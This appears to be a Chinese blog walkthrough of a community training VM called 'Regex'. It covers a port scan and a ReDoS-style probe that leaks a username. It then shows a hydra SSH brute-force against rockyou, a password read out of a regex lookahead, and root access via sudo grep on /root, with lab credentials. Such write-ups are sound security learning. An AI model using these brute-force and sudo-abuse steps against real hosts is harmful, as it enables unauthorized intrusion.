---
title: "群友靶机之Regex"
date: "2025-12-24 21:06:01"
tags: ["渗透测试"]
categories: ["群友靶机"]
url: "/posts/32329.html"
abbrlink: "32329"
---

获取靶机地址：https://maze-sec.com/

QQ群：`660930334`

# 配置：

```
靶机用VirtualBox制作，VMware导入可能网卡不兼容
用户:todd 密码:qq660930334
1. 启动虚拟机时按`e`键进入GRUB编辑模式
2. 修改启动参数：将`ro`改为`rw single init=/bin/bash`
3. 按Ctrl+X启动进入单用户模式
vim /etc/network/interfaces
allow-hotplug ens33
iface ens33 inet dhcp

ip link set ens33 up
dhclient ens33
reboot -f
```

# 端口扫描

![image-20251221200240753](/images/image-20251221200240753.png)

```
22,80,5000端口，80端口什么都没有，切入点应该在5000端口上了
```

# 服务探测

![image-20251221200452656](/images/image-20251221200452656.png)

```
进来是一个邮箱验证，目录扫描也没有什么tips点上，常规查看源码发现有一个被注释掉了的邮箱地址，看看有什么用先
```

![image-20251221200812511](/images/image-20251221200812511.png)

```
只是单纯的返回了邮箱验证正确，搜regax存在个redos攻击，那么可能验证的邮箱是用的正则匹配，可能存在redos攻击获得报错信息，刚好获得一个用户名信息---cyllove，那么就去ssh爆破
```

![image-20251221201433862](/images/image-20251221201433862.png)

# 爆破ssh

```
hydra -l cyllove -P /usr/share/wordlists/rockyou.txt 192.168.44.147 ssh
cyllove/pandora
```

![image-20251221202757561](/images/image-20251221202757561.png)

# 权限转移

![image-20251221202845317](/images/image-20251221202845317.png)

```
echo "$1"|grep -P '^(?=z)(?=.)(?=zY)(?=.*)(?=zYA)(?=zYAz)(?=.{4}8)(?=.{4}8G)(?=.{4}8GO)(?=.{4}8GOz)(?=.{4}8GOz3)(?=.{4}8GOz3O)(?=.{4}8GOz3OX)(?=.{4}8GOz3OXD)(?=.{12}k)(?=.{12}ki)(?=.{12}kim)(?=.{12}kimb)(?=.{12}kimbh)(?=.{12}kimbhR)(?=.{12}kimbhR2)(?=.{12}kimbhR24)(.){20}$'
[[ $? -eq 0 ]] && echo "Password Correct."
```

```
正则强匹配获得密码zYAz8GOz3OXDkimbhR24，ssh连接上去
```

# 权限提升

![image-20251221203616576](/images/image-20251221203616576.png)

```
给了权限个grep,sudo grep -Pnr . /root
可以直接过滤出root.txt,也可以获得root密码
t17Wej73Ugw39iphHxvK
```

![image-20251221203924867](/images/image-20251221203924867.png)

![image-20251221204010862](/images/image-20251221204010862.png)

![image-20251221204116176](/images/image-20251221204116176.png)
